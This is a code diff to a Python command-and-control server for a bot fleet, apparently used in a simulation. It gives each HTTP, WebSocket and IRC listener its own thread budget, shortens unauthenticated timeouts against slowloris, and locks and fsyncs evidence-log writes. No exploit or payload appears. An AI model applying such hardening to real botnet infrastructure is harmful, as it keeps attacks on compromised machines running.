@@ -66,6 +66,9 @@ MAX_EXFIL_TABLE_BYTES = 64 * 1024 * 1024    # total chunk bytes in exfil
 DEFAULT_BIND = "127.0.0.1"                  # #217: data listeners bind loopback unless told otherwise
 
 _lock = threading.Lock()
+# #299: evidence appends serialize on their own lock so a slow fsync never
+# blocks log() (and vice versa) while still guaranteeing whole-line writes.
+_ev_lock = threading.Lock()
 
 
 def log(line):
@@ -387,7 +390,9 @@ def recv_http(conn, default_cap=MAX_HTTP_REQUEST, upload_cap=MAX_UPLOAD_BODY):
     code because recv_http dropped 8MB uploads first. Non-upload requests
     keep the tighter default_cap; until headers are parsed, default_cap
     bounds header growth."""
-    conn.settimeout(30)
+    # #289: pre-auth idle timeout — authentication happens after the full
+    # request is parsed, so the whole read window is unauthenticated.
+    conn.settimeout(UNAUTH_RECV_TIMEOUT)
     buf = b""
     cap = default_cap
     try:
@@ -1029,7 +1034,8 @@ def serve_ws(c2, port, bind=DEFAULT_BIND):
     while True:
         try:
             conn, addr = srv.accept()
-            _spawn_conn_thread(handle_ws, conn, addr, c2)
+            _spawn_conn_thread(handle_ws, conn, addr, c2,
+                               budget=_ws_conn_sem)
         except KeyboardInterrupt:
             break
 
@@ -1047,7 +1053,9 @@ def irc_send(conn, line):
 
 def handle_irc(conn, addr, c2, nick, channel):
     ip = addr[0]
-    conn.settimeout(30)
+    # #289: registration (NICK/JOIN) is unauthenticated — shorter idle
+    # timeout; restored to the serve-loop timeout once the session starts.
+    conn.settimeout(UNAUTH_RECV_TIMEOUT)
     buf = ""
     bot_nick = "bot"
     chan = channel
@@ -1107,6 +1115,8 @@ def handle_irc(conn, addr, c2, nick, channel):
         # An unauthenticated client that just sends NICK gets PING/PONG only;
         # its queue requests are rejected so it can never drain bot commands.
         authenticated = False
+        # #289: authenticated serve loop gets the original idle timeout back.
+        conn.settimeout(30)
         deadline = time.time() + 86400
         while time.time() < deadline:
             try:
@@ -1187,7 +1197,8 @@ def serve_irc(c2, port, nick, channel, bind=DEFAULT_BIND):
     while True:
         try:
             conn, addr = srv.accept()
-            _spawn_conn_thread(handle_irc, conn, addr, c2, nick, channel)
+            _spawn_conn_thread(handle_irc, conn, addr, c2, nick, channel,
+                               budget=_irc_conn_sem)
         except KeyboardInterrupt:
             break
 
@@ -1464,16 +1475,30 @@ def serve_console(c2, port, bind="127.0.0.1"):
 
 # ─────────────────────────── entrypoint ───────────────────────────
 
-# #187: bound concurrent connection threads per listener (the bot-side
-# proxy/relay got caps in #89/#91; the C2 never did). A semaphore-based
-# counter rejects over-cap accepts instead of spawning unbounded threads.
-MAX_CONN_THREADS = 128
-_conn_sem = threading.BoundedSemaphore(MAX_CONN_THREADS)
+# #187/#289: bound concurrent connection threads PER LISTENER (the bot-side
+# proxy/relay got caps in #89/#91; the C2 never did). A single shared
+# semaphore let ~128 idle sockets on ONE channel starve every other
+# listener's accepts (the whole bot fleet lost its C2), so each listener
+# now gets its own budget; an over-cap accept on one channel no longer
+# affects the others.
+MAX_CONN_THREADS_PER_LISTENER = 64
+_http_conn_sem = threading.BoundedSemaphore(MAX_CONN_THREADS_PER_LISTENER)
+_ws_conn_sem = threading.BoundedSemaphore(MAX_CONN_THREADS_PER_LISTENER)
+_irc_conn_sem = threading.BoundedSemaphore(MAX_CONN_THREADS_PER_LISTENER)
+
+# #289: idle recv timeout for UNAUTHENTICATED connections. A client that
+# sends <1 byte per interval used to hold its thread for 30s per recv;
+# pre-auth reads (HTTP request parse, IRC NICK/JOIN registration) now time
+# out three times faster so slowloris threads recycle sooner.
+UNAUTH_RECV_TIMEOUT = 10
 
 
-def _spawn_conn_thread(target, conn, *args):
-    """Run target(conn, *args) in a thread if under the cap, else close."""
-    if not _conn_sem.acquire(blocking=False):
+def _spawn_conn_thread(target, conn, *args, budget=None):
+    """Run target(conn, *args) in a thread if under this listener's cap,
+    else close."""
+    if budget is None:
+        budget = _http_conn_sem
+    if not budget.acquire(blocking=False):
         try:
             conn.close()
         except OSError:
@@ -1487,7 +1512,7 @@ def _spawn_conn_thread(target, conn, *args):
                 conn.close()
             except OSError:
                 pass
-            _conn_sem.release()
+            budget.release()
     threading.Thread(target=_run, daemon=True).start()
 
 
@@ -1532,13 +1557,20 @@ class C2:
         os.makedirs(payload_dir, exist_ok=True)
 
     def ev(self, line):
-        """Append a sim-mock-format evidence line (SIM_EVIDENCE set only)."""
+        """Append a sim-mock-format evidence line (SIM_EVIDENCE set only).
+
+        #299: appends are serialized under a lock (matching log()) so
+        concurrent HTTP/WS/IRC threads cannot interleave torn lines, and
+        flushed + fsynced before returning so evidence survives a crash."""
         if not self.evidence:
             return
         ts = datetime.now(timezone.utc).isoformat()
         try:
-            with open(self.evidence, "a") as f:
-                f.write(f"{ts} {line}\n")
+            with _ev_lock:
+                with open(self.evidence, "a") as f:
+                    f.write(f"{ts} {line}\n")
+                    f.flush()
+                    os.fsync(f.fileno())
         except OSError:
             pass
 
